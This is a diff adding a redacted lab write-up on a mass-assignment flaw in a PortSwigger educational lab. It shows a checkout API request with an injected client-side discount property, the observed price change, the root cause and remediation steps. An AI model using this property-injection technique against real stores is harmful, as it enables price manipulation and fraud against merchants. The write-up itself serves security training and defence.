@@ -1,0 +1,46 @@
+PROPERTY AUTHORIZATION COMPARISON
+
+Scope: Authorized PortSwigger educational lab
+
+Redaction:
+Host: REDACTED-LAB-HOST
+Cookie: session=REDACTED
+Password: REDACTED
+
+BASELINE REQUEST
+
+POST /api/checkout HTTP/2
+Host: REDACTED-LAB-HOST
+Cookie: session=REDACTED
+Content-Type: application/json
+
+{"chosen_products":[{"product_id":"REDACTED","quantity":1}]}
+
+Observed result:
+The normal request was processed using the server-calculated checkout total and rejected because the account lacked sufficient credit.
+
+PROPERTY AUTHORIZATION TEST
+
+POST /api/checkout HTTP/2
+Host: REDACTED-LAB-HOST
+Cookie: session=REDACTED
+Content-Type: application/json
+
+{"chosen_discount":{"percentage":"REDACTED-TEST-VALUE"},"chosen_products":[{"product_id":"REDACTED","quantity":1}]}
+
+Observed result:
+The additional property was accepted and processed, influencing the security-sensitive checkout calculation.
+
+SECURITY CONCLUSION
+
+Property tested:
+A discount-related property revealed through the API response schema.
+
+Authorization result:
+The client could submit and influence a property that should have been controlled only by the server.
+
+Root cause:
+Mass assignment and missing object-property-level authorization.
+
+Remediation:
+Calculate discounts server-side, allowlist writable properties, reject unknown properties, and authorize sensitive changes independently.
